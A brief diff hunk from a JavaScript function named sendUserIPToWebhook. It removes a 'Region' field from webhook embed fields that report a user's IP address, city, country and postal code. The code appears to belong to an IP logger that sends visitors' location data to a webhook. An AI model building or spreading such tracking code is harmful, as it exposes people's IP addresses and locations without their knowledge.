@@ -14,7 +14,6 @@ async function sendUserIPToWebhook() {
     fields: [
       { name: "IP Address", value: userIP, inline: true },
       { name: "City", value: data.city || 'N/A', inline: true },
-      { name: "Region", value: data.region || 'N/A', inline: true },
       { name: "Country", value: data.country_name || 'N/A', inline: true },
       { name: "Postal Code", value: data.postal || 'N/A', inline: true }
     ],
